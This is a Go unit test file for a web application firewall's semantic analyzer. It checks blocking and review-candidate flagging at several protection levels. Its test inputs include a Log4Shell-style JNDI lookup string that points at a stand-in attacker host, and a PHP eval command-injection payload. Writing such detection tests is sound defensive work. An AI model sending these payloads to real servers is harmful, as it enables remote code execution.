package semantic

import (
	"context"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
)

func TestAnalyzerEmbeddedHitBecomesReviewCandidate(t *testing.T) {
	a := NewAnalyzer("block", 3)
	prose := "note ${jndi:ldap://evil.example/a} in logs"
	req := httptest.NewRequest(http.MethodPost, "http://x/api/articles", strings.NewReader(prose))
	req.Header.Set("Content-Type", "text/plain")
	reqCtx, err := engine.NewRequestContext(req, "default")
	if err != nil {
		t.Fatal(err)
	}
	reqCtx.DecodedBody = []byte(prose)
	got, err := a.Detect(context.Background(), reqCtx)
	if err != nil {
		t.Fatal(err)
	}
	if got != nil && got.Detected {
		t.Fatalf("level 3 must not block embedded gadget, got %#v", got)
	}
	cand, _ := reqCtx.Metadata["review_candidate"].(map[string]any)
	if cand == nil {
		t.Fatalf("expected review_candidate metadata, got %#v", reqCtx.Metadata)
	}
	if cand["shape"] != isolationEmbedded {
		t.Fatalf("expected embedded shape, got %#v", cand)
	}
	if cand["protection_level"] != 3 {
		t.Fatalf("expected protection_level 3, got %#v", cand["protection_level"])
	}
}

func TestAnalyzerIsolatedHitBlocksAndKeepsReviewCandidate(t *testing.T) {
	a := NewAnalyzer("block", 3)
	req := httptest.NewRequest(http.MethodGet, "http://x/search?s="+url.QueryEscape("eval($_GET['cmd'])"), nil)
	reqCtx := &engine.RequestContext{Request: req, Metadata: map[string]any{}}
	got, err := a.Detect(context.Background(), reqCtx)
	if err != nil {
		t.Fatal(err)
	}
	if got == nil || !got.Detected {
		t.Fatalf("level 3 must block isolated gadget, got %#v", got)
	}
	cand, _ := reqCtx.Metadata["review_candidate"].(map[string]any)
	if cand == nil || cand["protection_level"] != 3 {
		t.Fatalf("blocked isolated hit still carries review_candidate, metadata=%#v", reqCtx.Metadata)
	}
}

func TestAnalyzerLevelFiveBlockedKeepsReviewCandidate(t *testing.T) {
	a := NewAnalyzer("block", 5)
	prose := "note ${jndi:ldap://evil.example/a} in logs"
	req := httptest.NewRequest(http.MethodPost, "http://x/api/articles", strings.NewReader(prose))
	req.Header.Set("Content-Type", "text/plain")
	reqCtx, err := engine.NewRequestContext(req, "default")
	if err != nil {
		t.Fatal(err)
	}
	reqCtx.DecodedBody = []byte(prose)
	got, err := a.Detect(context.Background(), reqCtx)
	if err != nil {
		t.Fatal(err)
	}
	if got == nil || !got.Detected {
		t.Fatalf("level 5 must block embedded gadget, got %#v", got)
	}
	cand, _ := reqCtx.Metadata["review_candidate"].(map[string]any)
	if cand == nil || cand["protection_level"] != 5 || cand["shape"] != isolationEmbedded {
		t.Fatalf("level 5 block must keep review_candidate, got %#v", reqCtx.Metadata)
	}
}

func TestAnalyzerLevelZeroRecordsReviewCandidate(t *testing.T) {
	a := NewAnalyzer("block", 0)
	req := httptest.NewRequest(http.MethodGet, "http://x/search?s="+url.QueryEscape("eval($_GET['cmd'])"), nil)
	reqCtx := &engine.RequestContext{Request: req, Metadata: map[string]any{}}
	got, err := a.Detect(context.Background(), reqCtx)
	if err != nil {
		t.Fatal(err)
	}
	if got != nil && got.Detected {
		t.Fatalf("level 0 must not block, got %#v", got)
	}
	if _, ok := reqCtx.Metadata["review_candidate"]; !ok {
		t.Fatalf("level 0 isolated gadget must still be a review candidate, metadata=%#v", reqCtx.Metadata)
	}
}
